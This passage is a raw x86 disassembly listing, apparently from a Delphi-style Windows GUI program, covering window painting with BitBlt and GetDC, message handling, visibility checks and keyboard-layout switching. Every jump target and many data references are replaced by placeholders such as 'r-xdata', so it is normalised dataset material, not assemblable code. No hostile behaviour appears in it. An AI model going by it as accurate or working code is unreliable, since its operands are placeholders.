je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44261c
jmp r-xdata
mov eax ebx
call sub_441698
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442c4a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_444968
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43f334
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_442af8
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_444968
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_442c58
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442c78
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442cec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442d0c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442d2c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442d50
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442d74
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442d98
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442dbc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_4301bc
mov edi eax
mov eax edi
call sub_43029c
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41cf48
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_444968
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_430434
jmp r-xdata
sub_442e44
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43fc68
test bl bl
je r-xdata
mov eax edi
call sub_444c78
mov eax edi
call sub_444870
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_444870
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_442f04
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43f8c4
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_442f54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_444c78
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_441228
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_40348c
sub_442f9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43dc90
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_442254
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45dc14
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c0fc
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_4430ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4431cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4431d2
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_444968
mov dl [ ebx + 0x184 ]
call sub_44960c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c074
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407da8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45be74
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45be74
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45be74
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_4431d8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_443262
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443269
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c074
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407da8
test eax eax
je r-xdata
mov eax ebx
call sub_444968
mov dl 0x1
call sub_4495f0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_4432c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412630
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43f334
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_443314
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_443348
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_40348c
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_40348c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_443388
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43f334
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4433e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419934
mov edx [ r-xdata ]
call sub_403440
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_443418
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_413a74
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44343c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_444968
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_443498
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_443404
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413a74
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_4434d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405664
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405664
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_443544
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4435ec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4435f3
lea eax [ ebp - 0x4 ]
call sub_40564c
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43bdf8
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403290
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_40564c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_40348c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405664
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ edi + 0x178 ] eax
sub_4435fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_441200
xor edx edx
push ebp
push sub_4436be
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_40348c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4436c5
mov eax [ ebp - 0x4 ]
call sub_441208
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_4436c5
mov eax [ ebp - 0x4 ]
call sub_4553f0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43e3ac
sub_443710
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031d8
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43fff4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44377a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43e3ac
sub_443794
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_4437bc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4553f0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4552f8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_40348c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4437bc
test al al
jne r-xdata
sub_443824
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4437bc
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445ad4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_443850
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4437bc
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445ad4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44387c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_4438a4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4553f0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4552f8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_40348c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4438a4
test al al
jne r-xdata
sub_44390c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4438a4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44392c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4438a4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44396c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4553f0
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_40348c
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44396c
test al al
jne r-xdata
sub_4439d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44396c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4439f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44165c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43f334
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4439f0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_443aa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_4439f0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_4553f0
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43f334
test eax eax
jne r-xdata
sub_443b48
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_443b68
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4425e8
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_443b9c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4425e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_443bbc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_443c0c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_443c30
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43d418
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_441698
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44165c
mov dl [ esp ]
mov si 0xffd1
call sub_40348c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_443c88
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_40348c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_443cac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_40348c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_443ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fe08
mov eax [ rw-data ]
